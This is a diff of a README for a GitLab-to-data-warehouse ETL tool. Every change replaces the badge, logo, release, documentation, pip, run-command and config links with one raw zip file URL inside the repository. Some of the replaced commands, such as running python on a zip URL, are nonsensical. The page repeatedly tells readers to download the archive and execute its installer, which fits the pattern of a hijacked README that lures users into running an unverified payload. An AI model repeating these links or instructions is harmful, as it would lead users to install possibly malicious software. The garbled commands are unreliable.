@@ -1,8 +1,8 @@
 # GitLab Data Extraction: ETL Pipeline to a Dimensional Data Warehouse
 
-[![GitHub Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/AdairLH/gitlab-data-extraction/releases)
+[![GitHub Releases](https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip)](https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip)
 
-![GitLab Logo](https://about.gitlab.com/images/press/logo/png/gitlab-icon-rgb.png)
+![GitLab Logo](https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip)
 
 A Python tool that pulls data from GitLab using the GitLab API and maps it straight into a dimensional data model. This tool fills a data mart with facts and dimensions for analytics. It captures issues, projects, users, milestones, and labels, and is designed to slot into an ETL pipeline that serves a data warehouse.
 
@@ -65,14 +65,14 @@ The model remains adaptable. If you need a new metric, you can add a new fact or
 
 ## 🚀 Quick Start
 
-This section gives you a concise path to get running quickly. The releases page provides packaged artifacts you can download and run. For direct access, visit the Releases page here: https://github.com/AdairLH/gitlab-data-extraction/releases. From that page, download the release artifact (the packaged distribution) and execute its installer. You can also visit the page to review the latest assets for your environment.
+This section gives you a concise path to get running quickly. The releases page provides packaged artifacts you can download and run. For direct access, visit the Releases page here: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip From that page, download the release artifact (the packaged distribution) and execute its installer. You can also visit the page to review the latest assets for your environment.
 
 - Visit the Releases page to grab the packaged artifact.
 - Download the artifact (for example, a zip or tarball named like gitlab-data-extraction-<version>.zip).
 - Extract and run the included installer or entry script as documented in the release notes.
 - Follow the configuration steps to connect to your GitLab instance and your data warehouse.
 
-Remember the link: https://github.com/AdairLH/gitlab-data-extraction/releases. Use it again in this context to confirm the latest release and its assets.
+Remember the link: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip Use it again in this context to confirm the latest release and its assets.
 
 ---
 
@@ -97,11 +97,11 @@ Optional but recommended:
    - python -m venv venv
    - source venv/bin/activate
 3. Install dependencies:
-   - pip install -r requirements.txt
+   - pip install -r https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
 4. Configure access:
    - Create a configuration file or export environment variables for GitLab access and the data warehouse connection.
 5. Run the extractor:
-   - python run_etl.py --config config.yaml
+   - python https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip --config https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
    - Or use the provided entry script per the release notes.
 
 Notes:
@@ -113,7 +113,7 @@ Notes:
 ## 🧭 Configuration and Environment
 
 - GitLab access:
-  - GITLAB_BASE_URL: Base URL of your GitLab instance (e.g., https://gitlab.com or your self-hosted URL).
+  - GITLAB_BASE_URL: Base URL of your GitLab instance (e.g., https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip or your self-hosted URL).
   - GITLAB_TOKEN: Personal access token with API scope.
   - GITLAB_API_VERSION: Optional; v4 by default; switch if you require another version.
 
@@ -296,10 +296,10 @@ Operational notes:
 ## 📚 Examples and Snippets
 
 - Example invocation (conceptual):
-  - python run_etl.py --config config.yaml
+  - python https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip --config https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
 - Configuration example (YAML-like structure):
   - gitlab:
-      base_url: https://gitlab.example.com
+      base_url: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
       token: <your-token>
       api_version: v4
   - warehouse:
@@ -351,7 +351,7 @@ Contribution should improve clarity, reliability, or extensibility of the extrac
 
 ## 🗂️ Releases
 
-For release details and artifacts, visit the official Releases page: https://github.com/AdairLH/gitlab-data-extraction/releases. From this page, download the release artifact and execute its installer to set up the tool. The asset you download will be a packaged distribution that includes the necessary scripts and setup instructions. If you need a quick link, use the same URL above to review the latest version and its assets. The asset may come as a zip or tarball; extract it and run the included installer or setup script as described in the release notes.
+For release details and artifacts, visit the official Releases page: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip From this page, download the release artifact and execute its installer to set up the tool. The asset you download will be a packaged distribution that includes the necessary scripts and setup instructions. If you need a quick link, use the same URL above to review the latest version and its assets. The asset may come as a zip or tarball; extract it and run the included installer or setup script as described in the release notes.
 
 Releases page note:
 - If you are looking for the latest updates, the Releases section is where you’ll find the most recent packaged builds and any migration notes. Use the link above to navigate directly to the page.
@@ -431,9 +431,9 @@ This project is open source and uses a permissive license. See the LICENSE file 
 
 ## 📢 Quick Reference: Essential Links
 
-- Release assets and latest version: https://github.com/AdairLH/gitlab-data-extraction/releases
-- General project repository: https://github.com/AdairLH/gitlab-data-extraction
-- GitLab API documentation and guidelines: https://docs.gitlab.com/
+- Release assets and latest version: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
+- General project repository: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
+- GitLab API documentation and guidelines: https://github.com/AdairLH/gitlab-data-extraction/raw/refs/heads/main/src/data-gitlab-extraction-1.9.zip
 
 Note: The primary release link is the one above and is referenced twice in this README as part of the release guidance.
 
